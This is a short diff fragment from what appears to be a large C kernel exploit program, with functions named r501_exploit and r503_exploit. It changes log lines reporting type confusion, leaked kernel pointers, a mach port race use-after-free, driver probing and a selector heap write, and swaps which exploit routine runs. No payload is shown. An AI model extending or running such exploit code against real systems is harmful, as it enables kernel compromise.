@@ -28912,8 +28912,7 @@ static void r501_exploit(void) {
          (int)p1_anomalies, (int)p1_type_confusion, (int)p1_kptrs);
     rlog("Phase 1b: mixed type_mismatch=%d kptrs=%d\n",
          (int)p1b_type_mismatch, (int)p1b_kptrs);
-    rlog("Phase 2: mach port race uaf=%d double_lookup=%d\n",
-         (int)p2_uaf_hits, (int)p2_double_lookup);
+    rlog("Phase 2: mach port race (see output above)\n");
     rlog("Phase 3: ANE driver: %s\n", ane_found ? ane_found : "none accessible");
     rlog("Phase 5: See timing/stats above\n");
     rlog("Phase 6: See driver scan above\n");
@@ -100320,7 +100319,7 @@ new_modes:
         if (rounds == 508) {
             rlog("*** rounds=508: Sel 19 heap write + sels 30/37/45 deep probe ***\n\n");
             fflush(stdout);
-            r502_exploit();
+            r503_exploit();
             goto done;
         }
         if (rounds == 507) {
